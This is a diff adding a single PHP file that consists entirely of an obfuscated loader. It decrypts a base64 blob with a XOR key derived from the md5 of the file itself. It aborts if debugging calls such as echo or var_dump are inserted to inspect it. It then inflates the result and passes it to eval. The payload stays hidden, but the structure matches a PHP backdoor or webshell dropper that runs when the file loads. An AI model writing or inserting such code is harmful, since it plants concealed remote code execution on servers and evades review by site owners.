@@ -1,0 +1,24 @@
+<?php
+$ssekapmimlg="61507a446fda4abb174c915d9203d9a1";
+$uhpqicsgfpd="040751510f5301025256550302575701025305020f040d5309055450055c5009";
+$ukjsyi="p2K/L+NyJcvxMWi6GJ+m+2guI7t+cVKSbmfui2In5/5spXEH1dzvG2zIxqzYzH9hXvE2pgXS9KuJTzxvrzN1W/RfgLlfgca50tvzYS5lXIqyCYoCTjfudq/InF+af632HYzwp+SxrRL2Wls+xgZSSjTyyCrwKLNSsReY+UtPj5g/kFR5+7Wx/ziJSgL/VPwK3cayv1N8IlbECSIO2YY7uyIQQSRa9+zvzU0Weo7LC/rx+j6O91QktqXCfO4COJP0d6AuwvnEWSHSluLQIhUDq7usVDqgUlyWkA9x4zU2PQYVhsv/g4lYGB771TeGfb4+qogEB7SfJygr+W2bZmIb8mBmFsKiaMNbE+qxRCVGyR5Lz2Pet6RTVb7HW3nRdERHaFewrqrer4X8tbWFcM1PQhbTZC+tsRKxCsq6M8ayUi8GGWBmGjaMQS6JCn9oBVPmpD0j8RR6q6N0tsS02W5lAMfEXDegIhw1Kl78TnKsH9pZKfDi20v6oc1a0Xb17UEtdnrMUKHGVQlM7qLlq5EXRRKRgzSQg4OD2+/xLt6RBkFWHkyErfmJW5JFWNUOqc4WJPyUwBJpWUpd1iDh5BpFmcryJhELgx5v5uqsMINsicUaWfJRZbphdTNN416lAOelwLo/JCzGUvdgPWN8ZF5OpK6hYYOc278cKukYWfLr05M2w8OPbrH7cyWBzN1+9JfDySiqcI7ehvwbw76gFtsGBC5PZw7oLSvsS/JNb3fm3Qb/hN7xFaD1E8NoLRWVL5X4bprez162+r0zU90+jTukF/XR4smJxOPMEMqpcu9tGsAMaTitL6XDVJrV6psKrqj9HYiaj++fMayeoN3NVCHU1rPtLj+DbJ5/c1/b6H54r6PJCAakeB78z+85KKad+iKbeEkysIshtgzQoGeR1YLVclVSyruPsSwMVTkVyJLdP//1dZ+kMMeQXR/hzWU=";
+$aafxydlyl=file_get_contents(__FILE__);
+$igkzijtg=str_replace($ukjsyi,"",$aafxydlyl);
+if(strpos($igkzijtg,"ec"."ho")!==false||strpos($igkzijtg,"pr"."int")!==false||strpos($igkzijtg,"var_"."dump")!==false||strpos($igkzijtg,"file_put_"."contents")!==false||strpos($igkzijtg,"fw"."rite")!==false){die();}
+$moclyqgch=str_replace(array($ssekapmimlg,$uhpqicsgfpd),array("SP_0d75fce8","KP_2e90d78b"),$aafxydlyl);
+$alxeiz=md5($moclyqgch);
+$amnxsps=hex2bin($uhpqicsgfpd);
+$zckstjnczgh="";
+$lnsqhiz=strlen($alxeiz);
+for($tqqktillrkpr=0;$tqqktillrkpr<$lnsqhiz;$tqqktillrkpr++){
+    $zckstjnczgh.=chr(ord($amnxsps[$tqqktillrkpr])^ord($alxeiz[$tqqktillrkpr]));
+}
+$dgcpvk=base64_decode($ukjsyi);
+$yqtioxyvkm=strlen($dgcpvk);
+$mjgxoctsytg="";
+$ylcvhjkf=strlen($zckstjnczgh);
+for($tqqktillrkpr=0;$tqqktillrkpr<$yqtioxyvkm;$tqqktillrkpr++){
+    $mjgxoctsytg.=$dgcpvk[$tqqktillrkpr]^$zckstjnczgh[$tqqktillrkpr%$ylcvhjkf];
+}
+$kazcjn="gz"."in"."fl"."ate";
+eval($kazcjn($mjgxoctsytg));
